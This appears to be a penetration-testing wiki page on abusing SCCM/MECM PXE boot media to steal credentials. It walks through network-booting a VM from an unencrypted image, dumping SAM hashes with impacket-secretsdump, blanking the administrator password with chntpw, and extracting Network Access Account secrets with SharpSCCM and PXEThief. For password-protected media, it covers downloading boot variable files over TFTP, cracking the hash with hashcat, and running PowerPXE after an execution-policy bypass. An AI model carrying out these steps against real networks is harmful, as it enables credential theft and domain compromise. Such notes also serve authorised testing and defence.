# Boot Image credentials recovery

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/sccm-mecm/cred-1-pxe-abuse#unencrypted-boot-mediums

## Tools: 

1) PXEThief https://github.com/MWR-CyberSec/PXEThief

2) SharpSCCM https://github.com/Mayyhem/SharpSCCM/releases/tag/v2.0.12

## Unencrypted Boot Mediums

PXE Boot mediums may be deployed to endpoints wherein the PXE boot image is not encrypted. When this is the case it is trivial to initiate the PXE installation sequence and pillage credentials on the resulting image when installation is complete. 

Broadly, this means it is trivial to obtain local SAM hashes and SCCM secrets from the installed image.

## Requirements

1) Unauthenticated network access

2) Line of sight to DHCP server (optional, but helps)

3) Line of sight to PXE-enabled distribution point

## Manual Process

1) This process can be performed manually by using virtualisation on the attack system (Virtualbox, Vmware etc..). Configuring a VM to network boot 

### NOTE: If using VirtualBox, ensure to install the VirtualBox extension pack otherwise this step may fail to obtain an image from the PXE server.

2) Once the initial PXE image is loaded, if the image is not password protected then we can simply proceed without requiring password input.

3) Proceed until an option for continuing with limited setup appears, then continue with the limited setup process.

4) When the system is finalised the logon screen for the administrator account will be presented. Gracefully shutdown the VM through the power options menu. 

### CAUTION! : Ensure the VM is gracefully shutdown through the windows power options. If the VM is terminated in an ungraceful state you will not have write access to reset the administrator password through a live boot medium.

5) Boot a live distro such as Kali Linux over the top of the newly created VM. Browse to the mounted Windows disk /Windows/Windows/System32/Config where the SAM and SYSTEM hive files reside. 

6) Then use impacket-secretsdump to obtain the SAM hashes from the system.

        impacket-seretsdump -system SYSTEM -sam SAM LOCAL

7) After this, ideally we will access the VM as the administrative account to identify further credentials. chntpw can be used to wipe any local account credentials within the SAM database, we will wipe the local administrator account credentials, save changes and reboot into the installed Windows VM.

##### List details about specific accounts

    chntpw -u <user> SAM

##### Interactive mode

    chntpw -i SAM

##### User edit mode and clear password
    
    Option 1
    Enter user RID
    Option 1 <-- Clear Password

#### Save changes and exit
    
    Enter
    q
    Enter
    y

After saving changes and rebooting the Windows VM. It should auto login as the native administrator account as there is now no password in place.

### NOTE: Sometimes this process seems to fail. If so try again and ensure the account is unlocked then blank the password again. Save the hive and perform a graceful shutdown in Kali.

8) Once logged in as an administrative user, it is advised to use SharpSCCM to identify any local secrets for the NAA account. There is potential for the NAA account to be over-privileged in domain or for its password to be reused within the environment.

        SharpSCCM.exe local secrets -m disk

## PXEThief

PXETHIEF is best utilised from a Windows based system so it can decrypt password values. PXETHIEF helps automate the process of collecting ConfigMgr Collection Variables, Task Sequence variables and NAA account credentials from PXE images.

##### Directly target MECM Server

        py.exe pxethief.py 2 <MECM Server IP>

##### Broadcast 

        py.exe pxethief.py 1


## Encrypted Boot Mediums

SCCM can be configured to set passwords on PXE. When this is the case, a valid password needs to be provided before the boot media is accessible. PXETHIEF can be used to obtain the hashed password value, if the password is weak, we can crack it and proceed with the same steps in the above sections of this document to perform credential extraction.

1) Download the boot var with TFTP

        tftp -i 192.168.60.11 GET "\SMSTemp\2024.04.13.14.11.18.0001.{51724F94-5668-41AD-A8B1-703658B6906C}.boot.var" "2024.04.13.14.11.18.0001.{51724F94-5668-41AD-A8B1-703658B6906C}.boot.var"

2) Use with option 5 in PXETHIEF to receive the PXE password hash

        py.exe .\pxethief.py 5 '.\2024.04.13.14.11.18.0001.{51724F94-5668-41AD-A8B1-703658B6906C}.boot.var'

3) Crach the hash (Required hash module: https://github.com/The-Viper-One/hashcat-6.2.6-SCCM or https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module)

        hashcat-6.2.6-SCCM.exe -m 19850 -a 0 $sccm$aes128$0000edec1400000010330000203300000e6600000000000008b5ea1dab29bdd0de62e6506b108b5c <password-file.txt> <rules>


Now that the PXE password has been obtained, the same steps in Unencrypted Boot Medium section can be followed for credential extraction.


#### 1) Request IP and PXE boot preconfigure details from DHCP ( MDT IP)

#### 2) Use TFTP to request each BCD file and enumerate the configuration for all of them.

#### 3) Use SSH connection

#### 4: tftp -i MDT_IP GET "\tmp\x64{30.....28}.bcd"

#### 5: powershell.exe -executionpolicy bypass

#### 6: Import-Module .\PowerPXE.ps1

#### 7: $bcdfILE = "conf.bcd"

#### 8: Get-WimFile -bcdFile $BCDFile

#### 9: tftp -i MDT_IP GET "PXE\BOOT\IMAGE\LOCATION" pxeboot.wim

#### 10: Get-FindCredentials -WimFile pxeboot.wim

#### 11: VOILA!

